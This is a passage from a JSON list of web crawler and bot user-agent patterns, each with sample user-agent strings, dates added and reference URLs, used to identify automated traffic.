    "pattern": "TelegramBot",
    "addition_date": "2017/10/01",
    "instances": [
      "TelegramBot (like TwitterBot)"
    ]
  }
  ,
  {
    "pattern": "Jetslide",
    "addition_date": "2017/09/27",
    "url": "http://jetsli.de/crawler",
    "instances": [
      "Mozilla/5.0 (compatible; Jetslide; +http://jetsli.de/crawler)"
    ]
  }
  ,
  {
    "pattern": "newsharecounts",
    "addition_date": "2017/09/30",
    "url": "http://newsharecounts.com/crawler",
    "instances": [
      "Mozilla/5.0 (compatible; NewShareCounts.com/1.0; +http://newsharecounts.com/crawler)"
    ]
  }
  ,
  {
    "pattern": "James BOT",
    "addition_date": "2017/10/12",
    "url": "http://cognitiveseo.com/bot.html",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 - James BOT - WebCrawler http://cognitiveseo.com/bot.html"
    ]
  }
  ,
  {
    "pattern": "Bark[rR]owler",
    "addition_date": "2017/10/09",
    "url": "http://www.exensa.com/crawl",
    "instances": [
      "Barkrowler/0.5.1 (experimenting / debugging - sorry for your logs ) http://www.exensa.com/crawl - admin@exensa.com -- based on BuBiNG",
      "Barkrowler/0.7 (+http://www.exensa.com/crawl)",
      "BarkRowler/0.7 (+http://www.exensa.com/crawling)",
      "Barkrowler/0.9 (+http://www.exensa.com/crawl)"
    ]
  }
  ,
  {
    "pattern": "TinEye",
    "addition_date": "2017/10/14",
    "url": "http://www.tineye.com/crawler.html",
    "instances": [
      "Mozilla/5.0 (compatible; TinEye-bot/1.31; +http://www.tineye.com/crawler.html)",
      "TinEye/1.1 (http://tineye.com/crawler.html)"
    ]
  }
  ,
  {
    "pattern": "SocialRankIOBot",
    "addition_date": "2017/10/19",
    "url": "http://socialrank.io/about",
    "instances": [
      "SocialRankIOBot; http://socialrank.io/about"
    ]
  }
  ,
  {
    "pattern": "trendictionbot",
    "addition_date": "2017/10/30",
    "url": "http://www.trendiction.de/bot",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.0; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20071127 Firefox/3.0.0.11",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20170101 Firefox/67.0"
    ]
  }
  ,
  {
    "pattern": "Ocarinabot",
    "addition_date": "2017/09/27",
    "instances": [
      "Ocarinabot"
    ]
  }
  ,
  {
    "pattern": "epicbot",
    "addition_date": "2017/10/31",
    "url": "http://www.epictions.com/epicbot",
    "instances": [
      "Mozilla/5.0 (compatible; epicbot; +http://www.epictions.com/epicbot)"
    ]
  }
  ,
  {
    "pattern": "Primalbot",
    "addition_date": "2017/09/27",
    "url": "https://www.primal.com",
    "instances": [
      "Mozilla/5.0 (compatible; Primalbot; +https://www.primal.com;)"
    ]
  }
  ,
  {
    "pattern": "DuckDuckGo-Favicons-Bot",
    "addition_date": "2017/10/06",
    "url": "http://duckduckgo.com",
    "instances": [
      "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
    ]
  }
  ,
  {
    "pattern": "GnowitNewsbot",
    "addition_date": "2017/10/30",
    "url": "http://www.gnowit.com",
    "instances": [
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 / GnowitNewsbot / Contact information at http://www.gnowit.com"
    ]
  }
  ,
  {
    "pattern": "Leikibot",
    "addition_date": "2017/09/24",
    "url": "http://www.leiki.com",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.3;compatible; Leikibot/1.0; +http://www.leiki.com)"
    ]
  }
  ,
  {
    "pattern": "LinkArchiver",
    "addition_date": "2017/09/24",
    "instances": [
      "@LinkArchiver twitter bot"
    ]
  }
  ,
  {
    "pattern": "YaK\\/",
    "addition_date": "2017/09/25",
    "url": "http://linkfluence.com",
    "instances": [
      "Mozilla/5.0 (compatible; YaK/1.0; http://linkfluence.com/; bot@linkfluence.com)"
    ]
  }
  ,
  {
    "pattern": "PaperLiBot",
    "addition_date": "2017/09/25",
    "url": "http://support.paper.li/entries/20023257-what-is-paper-li",
    "instances": [
      "Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)",
      "Mozilla/5.0 (compatible; PaperLiBot/2.1; https://support.paper.li/entries/20023257-what-is-paper-li)"

    ]
  }
  ,
  {
    "pattern": "Digg Deeper",
    "addition_date": "2017/09/26",
    "url": "http://digg.com/about",
    "instances": [
      "Digg Deeper/v1 (http://digg.com/about)"
    ]
  }
  ,
  {
    "pattern": "dcrawl",
    "addition_date": "2017/09/22",
    "instances": [
      "dcrawl/1.0"
    ]
  }
  ,
  {
    "pattern": "Snacktory",
    "addition_date": "2017/09/23",
    "url": "https://github.com/karussell/snacktory",
    "instances": [
      "Mozilla/5.0 (compatible; Snacktory; +https://github.com/karussell/snacktory)"
    ]
  }
  ,
  {
    "pattern": "AndersPinkBot",
    "addition_date": "2017/09/24",
    "url": "http://anderspink.com/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; AndersPinkBot/1.0; +http://anderspink.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Fyrebot",
    "addition_date": "2017/09/22",
    "instances": [
      "Fyrebot/1.0"
    ]
  }
  ,
  {
    "pattern": "EveryoneSocialBot",
    "addition_date": "2017/09/22",
    "url": "http://everyonesocial.com",
    "instances": [
      "Mozilla/5.0 (compatible; EveryoneSocialBot/1.0; support@everyonesocial.com http://everyonesocial.com/)"
    ]
  }
  ,
  {
    "pattern": "Mediatoolkitbot",
    "addition_date": "2017/10/06",
    "url": "http://mediatoolkit.com",
    "instances": [
      "Mediatoolkitbot (complaints@mediatoolkit.com)"
    ]
  }
  ,
  {
    "pattern": "Luminator-robots",
    "addition_date": "2017/09/22",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.13 Luminator-robots/2.0"
    ]
  }
  ,
  {
    "pattern": "ExtLinksBot",
    "addition_date": "2017/11/02",
    "url": "https://extlinks.com/Bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; ExtLinksBot/1.5 +https://extlinks.com/Bot.html)"
    ]
  }
  ,
  {
    "pattern": "SurveyBot",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)"
    ]
  }
  ,
  {
    "pattern": "NING\\/",
    "addition_date": "2017/11/02",
    "instances": [
      "NING/1.0"
    ]
  }
  ,
  {
    "pattern": "okhttp",
    "addition_date": "2017/11/02",
    "instances": [
      "okhttp/2.5.0",
      "okhttp/2.7.5",
      "okhttp/3.2.0",
      "okhttp/3.5.0",
      "okhttp/4.1.0"
    ]
  }
  ,
  {
    "pattern": "Nuzzel",
    "addition_date": "2017/11/02",
    "instances": [
      "Nuzzel"
    ]
  }
  ,
  {
    "pattern": "omgili",
    "addition_date": "2017/11/02",
    "url": "http://omgili.com",
    "instances": [
      "omgili/0.5 +http://omgili.com"
    ]
  }
  ,
  {
    "pattern": "PocketParser",
    "addition_date": "2017/11/02",
    "url": "https://getpocket.com/pocketparser_ua",
    "instances": [
      "PocketParser/2.0 (+https://getpocket.com/pocketparser_ua)"
    ]
  }
  ,
  {
    "pattern": "YisouSpider",
    "addition_date": "2017/11/02",
    "instances": [
      "YisouSpider",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "um-LN",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (compatible; um-LN/1.0; mailto: techinfo@ubermetrics-technologies.com)"
    ]
  }
  ,
  {
    "pattern": "ToutiaoSpider",
    "addition_date": "2017/11/02",
    "url": "http://web.toutiao.com/media_cooperation/",
    "instances": [
      "Mozilla/5.0 (compatible; ToutiaoSpider/1.0; http://web.toutiao.com/media_cooperation/;)"
    ]
  }
  ,
  {
    "pattern": "MuckRack",
    "addition_date": "2017/11/02",
    "url": "http://muckrack.com",
    "instances": [
      "Mozilla/5.0 (compatible; MuckRack/1.0; +http://muckrack.com)"
    ]
  }
  ,
  {
    "pattern": "Jamie's Spider",
    "addition_date": "2017/11/02",
    "url": "http://jamiembrown.com/",
    "instances": [
      "Jamie's Spider (http://jamiembrown.com/)"
    ]
  }
  ,
  {
    "pattern": "AHC\\/",
    "addition_date": "2017/11/02",
    "instances": [
      "AHC/2.0"
    ]
  }
  ,
  {
    "pattern": "NetcraftSurveyAgent",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
    ]
  }
  ,
  {
    "pattern": "Laserlikebot",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Laserlikebot/0.1)"
    ]
  }
  ,
  {
    "pattern": "^Apache-HttpClient",
    "addition_date": "2017/11/02",
    "instances": [
      "Apache-HttpClient/4.2.3 (java 1.5)",
      "Apache-HttpClient/4.2.5 (java 1.5)",
      "Apache-HttpClient/4.3.1 (java 1.5)",
      "Apache-HttpClient/4.3.3 (java 1.5)",
      "Apache-HttpClient/4.3.5 (java 1.5)",
      "Apache-HttpClient/4.4.1 (Java/1.8.0_65)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_65)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_151)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_161)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_181)",
      "Apache-HttpClient/4.5.3 (Java/1.8.0_121)",
      "Apache-HttpClient/4.5.3-SNAPSHOT (Java/1.8.0_152)",
      "Apache-HttpClient/4.5.7 (Java/11.0.3)",
      "Apache-HttpClient/4.5.10 (Java/1.8.0_201)"
    ]
  }
  ,
  {
    "pattern": "AppEngine-Google",
    "addition_date": "2017/11/02",
    "instances": [
      "AppEngine-Google; (+http://code.google.com/appengine; appid: example)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~feedly-nikon3)"
    ]
  }
  ,
  {
    "pattern": "Jetty",
    "addition_date": "2017/11/02",
    "instances": [
      "Jetty/9.3.z-SNAPSHOT"
    ]
  }
  ,
  {
    "pattern": "Upflow",
    "addition_date": "2017/11/02",
    "instances": [
      "Upflow/1.0"
    ]
  }
  ,
  {
    "pattern": "Thinklab",
    "addition_date": "2017/11/02",
    "url": "thinklab.com",
    "instances": [
      "Thinklab (thinklab.com)"
    ]
  }
  ,
  {
    "pattern": "Traackr.com",
    "addition_date": "2017/11/02",
    "url": "Traackr.com",
    "instances": [
      "Traackr.com"
    ]
  }
  ,
  {
    "pattern": "Twurly",
    "addition_date": "2017/11/02",
    "url": "http://twurly.org",
    "instances": [
      "Ruby, Twurly v1.1 (http://twurly.org)"
    ]
  }
  ,
  {
    "pattern": "Mastodon",
    "addition_date": "2017/11/02",
    "instances": [
      "http.rb/2.2.2 (Mastodon/1.5.1; +https://example-masto-instance.org/)"
    ]
  }
  ,
  {
    "pattern": "http_get",
    "addition_date": "2017/11/02",
    "instances": [
      "http_get"
    ]
  }
  ,
  {
    "pattern": "DnyzBot",
    "addition_date": "2017/11/20",
    "instances": [
      "Mozilla/5.0 (compatible; DnyzBot/1.0)"
    ]
  }
  ,
  {
    "pattern": "botify",
    "addition_date": "2018/02/01",
    "instances": [
      "Mozilla/5.0 (compatible; botify; http://botify.com)"
    ]
  }
  ,
  {
    "pattern": "007ac9 Crawler",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; 007ac9 Crawler; http://crawler.007ac9.net/)"
    ]
  }
  ,
  {
    "pattern": "BehloolBot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; BehloolBot/beta; +http://www.webeaver.com/bot)"
    ]
  }
  ,
  {
    "pattern": "BrandVerity",
    "addition_date": "2018/02/27",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/55.0 BrandVerity/1.0 (http://www.brandverity.com/why-is-brandverity-visiting-me)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11A465 Twitter for iPhone BrandVerity/1.0 (http://www.brandverity.com/why-is-brandverity-visiting-me)"
    ],
    "url": "http://www.brandverity.com/why-is-brandverity-visiting-me"
  }
  ,
  {
    "pattern": "check_http",
    "addition_date": "2018/02/09",
    "instances": [
      "check_http/v2.2.1 (nagios-plugins 2.2.1)"
    ]
  }
  ,
  {
    "pattern": "BDCbot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; compatible; BDCbot/1.0; +http://bigweb.bigdatacorp.com.br/faq.aspx) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; BDCbot/1.0; +http://bigweb.bigdatacorp.com.br/faq.aspx) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "ZumBot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; ZumBot/1.0; http://help.zum.com/inquiry)"
    ]
  }
  ,
  {
    "pattern": "EZID",
    "addition_date": "2018/02/09",
    "instances": [
      "EZID (EZID link checker; https://ezid.cdlib.org/)"
    ]
  }
  ,
  {
    "pattern": "ICC-Crawler",
    "addition_date": "2018/02/28",
    "instances": [
      "ICC-Crawler/2.0 (Mozilla-compatible; ; http://ucri.nict.go.jp/en/icccrawler.html)"
    ],
    "url": "http://ucri.nict.go.jp/en/icccrawler.html"
  }
  ,
  {
    "pattern": "ArchiveBot",
    "addition_date": "2018/02/28",
    "instances": [
      "ArchiveTeam ArchiveBot/20170106.02 (wpull 2.0.2)"
    ],
    "url": "https://github.com/ArchiveTeam/ArchiveBot"
  }
  ,
  {
    "pattern": "^LCC ",
    "addition_date": "2018/02/28",
    "instances": [
      "LCC (+http://corpora.informatik.uni-leipzig.de/crawler_faq.html)"
    ],
    "url": "http://corpora.informatik.uni-leipzig.de/crawler_faq.html"
  }
  ,
  {
    "pattern": "filterdb.iss.net\\/crawler",
    "addition_date": "2018/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; oBot/2.3.1; +http://filterdb.iss.net/crawler/)"
    ],
    "url": "http://filterdb.iss.net/crawler/"
  }
  ,
  {
    "pattern": "BLP_bbot",
    "addition_date": "2018/03/27",
    "instances": [
      "BLP_bbot/0.1"
    ]
  }
  ,
  {
    "pattern": "BomboraBot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; BomboraBot/1.0; +http://www.bombora.com/bot)"
    ],
    "url": "http://www.bombora.com/bot"
  }
  ,
  {
    "pattern": "Buck\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "Buck/2.2; (+https://app.hypefactors.com/media-monitoring/about.html)"
    ],
    "url": "https://app.hypefactors.com/media-monitoring/about.html"
  }
  ,
  {
    "pattern": "Companybook-Crawler",
    "addition_date": "2018/03/27",
    "instances": [
      "Companybook-Crawler (+https://www.companybooknetworking.com/)"
    ],
    "url": "https://www.companybooknetworking.com/"
  }
  ,
  {
    "pattern": "Genieo",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; Genieo/1.0 http://www.genieo.com/webfilter.html)"
    ],
    "url": "http://www.genieo.com/webfilter.html"
  }
  ,
  {
    "pattern": "magpie-crawler",
    "addition_date": "2018/03/27",
    "instances": [
      "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)"
    ],
    "url": "http://www.brandwatch.net"
  }
  ,
  {
    "pattern": "MeltwaterNews",
    "addition_date": "2018/03/27",
    "instances": [
      "MeltwaterNews www.meltwater.com"
    ],
    "url": "http://www.meltwater.com"
  }
  ,
  {
    "pattern": "Moreover",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 Moreover/5.1 (+http://www.moreover.com)"
    ],
    "url": "http://www.moreover.com"
  }
  ,
  {
    "pattern": "newspaper\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "newspaper/0.1.0.7",
      "newspaper/0.2.5",
      "newspaper/0.2.6",
      "newspaper/0.2.8"
    ]
  }
  ,
  {
    "pattern": "ScoutJet",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; ScoutJet; +http://www.scoutjet.com/)"
    ],
    "url": "http://www.scoutjet.com/"
  }
  ,
  {
    "pattern": "(^| )sentry\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "sentry/8.22.0 (https://sentry.io)"
    ],
    "url": "https://sentry.io"
  }
  ,
  {
    "pattern": "StorygizeBot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; StorygizeBot; http://www.storygize.com)"
    ],
    "url": "http://www.storygize.com"
  }
  ,
  {
    "pattern": "UptimeRobot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
    ],
    "url": "http://www.uptimerobot.com/"
  }
  ,
  {
    "pattern": "OutclicksBot",
    "addition_date": "2018/04/21",
    "instances": [
      "OutclicksBot/2 +https://www.outclicks.net/agent/VjzDygCuk4ubNmg40ZMbFqT0sIh7UfOKk8s8ZMiupUR",
      "OutclicksBot/2 +https://www.outclicks.net/agent/gIYbZ38dfAuhZkrFVl7sJBFOUhOVct6J1SvxgmBZgCe",
      "OutclicksBot/2 +https://www.outclicks.net/agent/PryJzTl8POCRHfvEUlRN5FKtZoWDQOBEvFJ2wh6KH5J",
      "OutclicksBot/2 +https://www.outclicks.net/agent/p2i4sNUh7eylJF1S6SGgRs5mP40ExlYvsr9GBxVQG6h"
    ],
    "url": "https://www.outclicks.net"
  }
  ,
  {
    "pattern": "seoscanners",
    "addition_date": "2018/05/27",
    "instances": [
      "Mozilla/5.0 (compatible; seoscanners.net/1; +spider@seoscanners.net)"
    ],
    "url": "http://www.seoscanners.net/"
  }
  ,
  {
    "pattern": "Hatena",
    "addition_date": "2018/05/29",
    "instances": [
      "Hatena Antenna/0.3",
      "Hatena::Russia::Crawler/0.01",
      "Hatena-Favicon/2 (http://www.hatena.ne.jp/faq/)",
      "Hatena::Scissors/0.01",
      "HatenaBookmark/4.0 (Hatena::Bookmark; Analyzer)",
      "Hatena::Fetcher/0.01 (master) Furl/3.13"
    ]
  }
  ,
  {
    "pattern": "Google Web Preview",
    "addition_date": "2018/05/31",
    "instances": [
      "Mozilla/5.0 (Linux; U; Android 2.3.4; generic) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Version/4.0 Mobile Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "MauiBot",
    "addition_date": "2018/06/06",
    "instances": [
      "MauiBot (crawler.feedback+wc@gmail.com)"
    ]
  }
  ,
  {
    "pattern": "AlphaBot",
    "addition_date": "2018/05/27",
    "instances": [
      "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
    ],
    "url": "http://alphaseobot.com/bot.html"
  }
  ,
  {
    "pattern": "SBL-BOT",
    "addition_date": "2018/06/06",
    "instances": [
      "SBL-BOT (http://sbl.net)"
    ],
    "url": "http://sbl.net",
    "description" : "Bot of SoftByte BlackWidow"
  }
  ,
  {
    "pattern": "IAS crawler",
    "addition_date": "2018/06/06",
    "instances": [
      "IAS crawler (ias_crawler; http://integralads.com/site-indexing-policy/)"
    ],
    "url": "http://integralads.com/site-indexing-policy/",
    "description" : "Bot of Integral Ad Science, Inc."
  }
  ,
  {
    "pattern": "adscanner",
    "addition_date": "2018/06/24",
    "instances": [
      "Mozilla/5.0 (compatible; adscanner/)"
    ]
  }
  ,
  {
    "pattern": "Netvibes",
    "addition_date": "2018/06/24",
    "instances": [
      "Netvibes (crawler/bot; http://www.netvibes.com",
      "Netvibes (crawler; http://www.netvibes.com)"
    ],
    "url": "http://www.netvibes.com"
  }
  ,
  {
    "pattern": "acapbot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible;acapbot/0.1;treat like Googlebot)",
      "Mozilla/5.0 (compatible;acapbot/0.1.;treat like Googlebot)"
    ]
  }
  ,
  {
    "pattern": "Baidu-YunGuanCe",
    "addition_date": "2018/06/27",
    "instances": [
      "Baidu-YunGuanCe-Bot(ce.baidu.com)",
      "Baidu-YunGuanCe-SLABot(ce.baidu.com)",
      "Baidu-YunGuanCe-ScanBot(ce.baidu.com)",
      "Baidu-YunGuanCe-PerfBot(ce.baidu.com)",
      "Baidu-YunGuanCe-VSBot(ce.baidu.com)"
    ],
    "url": "https://ce.baidu.com/topic/topic20150908",
    "description": "Baidu Cloud Watch"
  }
  ,
  {
    "pattern": "bitlybot",
    "addition_date": "2018/06/27",
    "instances": [
      "bitlybot/3.0 (+http://bit.ly/)",
      "bitlybot/2.0",
      "bitlybot"
    ],
    "url": "http://bit.ly/"
  }
  ,
  {
    "pattern": "blogmuraBot",
    "addition_date": "2018/06/27",
    "instances": [
      "blogmuraBot (+http://www.blogmura.com)"
    ],
    "url": "http://www.blogmura.com",
    "description": "A blog ranking site which links to blogs on just about every theme possible."
  }
  ,
  {
    "pattern": "Bot.AraTurka.com",
    "addition_date": "2018/06/27",
    "instances": [
      "Bot.AraTurka.com/0.0.1"
    ],
    "url": "http://www.araturka.com"
  }
  ,
  {
    "pattern": "bot-pge.chlooe.com",
    "addition_date": "2018/06/27",
    "instances": [
      "bot-pge.chlooe.com/1.0.0 (+http://www.chlooe.com/)"
    ]
  }
  ,
  {
    "pattern": "BoxcarBot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; BoxcarBot/1.1; +awesome@boxcar.io)"
    ],
    "url": "https://boxcar.io/"
  }
  ,
  {
    "pattern": "BTWebClient",
    "addition_date": "2018/06/27",
    "instances": [
      "BTWebClient/180B(9704)"
    ],
    "url": "http://www.utorrent.com/",
    "description": "µTorrent BitTorrent Client"
  }
  ,
  {
    "pattern": "ContextAd Bot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;.NET CLR 1.0.3705; ContextAd Bot 1.0)",
      "ContextAd Bot 1.0"
    ]
  }
  ,
  {
    "pattern": "Digincore bot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; Digincore bot; https://www.digincore.com/crawler.html for rules and instructions.)"
    ],
    "url": "http://www.digincore.com/crawler.html"
  }
  ,
  {
    "pattern": "Disqus",
    "addition_date": "2018/06/27",
    "instances": [
      "Disqus/1.0"
    ],
    "url": "https://disqus.com/",
    "description": "validate and quality check pages."
  }
  ,
  {
    "pattern": "Feedly",
    "addition_date": "2018/06/27",
    "instances": [
      "Feedly/1.0 (+http://www.feedly.com/fetcher.html; like FeedFetcher-Google)",
      "FeedlyBot/1.0 (http://feedly.com)"
    ],
    "url": "https://www.feedly.com/fetcher.html",
    "description": "Feedly Fetcher is how Feedly grabs RSS or Atom feeds when users choose to add them to their Feedly or any of the other applications built on top of the feedly cloud."
  }
  ,
  {
    "pattern": "Fetch\\/",
    "addition_date": "2018/06/27",
    "instances": [
      "Fetch/2.0a (CMS Detection/Web/SEO analysis tool, see http://guess.scritch.org)"
    ]
  }
  ,
  {
    "pattern": "Fever",
    "addition_date": "2018/06/27",
    "instances": [
      "Fever/1.38 (Feed Parser; http://feedafever.com; Allow like Gecko)"
    ],
    "url": "http://feedafever.com"
  }
  ,
  {
    "pattern": "Flamingo_SearchEngine",
    "addition_date": "2018/06/27",
    "instances": [
      "Flamingo_SearchEngine (+http://www.flamingosearch.com/bot)"
    ]
  }
  ,
  {
    "pattern": "FlipboardProxy",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (compatible; FlipboardProxy/1.2; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
    ],
    "url": "https://about.flipboard.com/browserproxy/",
    "description": "a proxy service to fetch, validate, and prepare certain elements of websites for presentation through the Flipboard Application"
  }
  ,
  {
    "pattern": "g2reader-bot",
    "addition_date": "2018/06/27",
    "instances": [
      "g2reader-bot/1.0 (+http://www.g2reader.com/)"
    ],
    "url": "http://www.g2reader.com/"
  }
  ,
  {
    "pattern": "G2 Web Services",
    "addition_date": "2019/03/01",
    "instances": [
      "G2 Web Services/1.0 (built with StormCrawler Archetype 1.8; https://www.g2webservices.com/; developers@g2llc.com)"
    ],
    "url": "https://www.g2webservices.com/"
  }
  ,
  {
    "pattern": "imrbot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; imrbot/1.10.8 +http://www.mignify.com)"
    ],
    "url": "http://www.mignify.com"
  }
  ,
  {
    "pattern": "K7MLWCBot",
    "addition_date": "2018/06/27",
    "instances": [
      "K7MLWCBot/1.0 (+http://www.k7computing.com)"
    ],
    "url": "http://www.k7computing.com",
    "description": "Virus scanner"
  }
  ,
  {
    "pattern": "Kemvibot",
    "addition_date": "2018/06/27",
    "instances": [
      "Kemvibot/1.0 (http://kemvi.com, marco@kemvi.com)"
    ],
    "url": "http://kemvi.com"
  }
  ,
  {
    "pattern": "Landau-Media-Spider",
    "addition_date": "2018/06/27",
    "instances": [
      "Landau-Media-Spider/1.0(http://bots.landaumedia.de/bot.html)"
    ],
    "url": "http://bots.landaumedia.de/bot.html"
  }
  ,
  {
    "pattern": "linkapediabot",
    "addition_date": "2018/06/27",
    "instances": [
      "linkapediabot (+http://www.linkapedia.com)"
    ],
    "url": "http://www.linkapedia.com"
  }
  ,
  {
    "pattern": "vkShare",
    "addition_date": "2018/07/02",
    "instances": [
      "Mozilla/5.0 (compatible; vkShare; +http://vk.com/dev/Share)"
    ],
    "url": "http://vk.com/dev/Share"
  }
  ,
  {
    "pattern": "Siteimprove.com",
    "addition_date": "2018/06/22",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0) Match by Siteimprove.com",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) SiteCheck-sitecrawl by Siteimprove.com",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0) LinkCheck by Siteimprove.com"
    ]
  }
  ,
  {
     "pattern": "BLEXBot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
     ],
     "url": "http://webmeup-crawler.com"
  }
  ,
  {
     "pattern": "DareBoost",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36 DareBoost"
     ],
     "url": "https://www.dareboost.com/",
     "description": "Bot to test, Analyze and Optimize website"
  }
  ,
  {
     "pattern": "ZuperlistBot\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; ZuperlistBot/1.0)"
     ]
  }
  ,
  {
     "pattern": "Miniflux\\/",
     "addition_date": "2018/07/07",
     "instances": [
       "Mozilla/5.0 (compatible; Miniflux/2.0.x-dev; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.3; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.7; +https://miniflux.net)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.10; +https://miniflux.net)",
       "Mozilla/5.0 (compatibl$; Miniflux/2.0.x-dev; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.11; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/2.0.12; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/ae1dc1a; +https://miniflux.app)",
       "Mozilla/5.0 (compatible; Miniflux/3b6e44c; +https://miniflux.app)"
     ],
     "url": "https://miniflux.net",
     "description": "Miniflux is a minimalist and opinionated feed reader."
  }
  ,
  {
     "pattern": "Feedspot",
     "addition_date": "2018/07/07",
     "instances": [
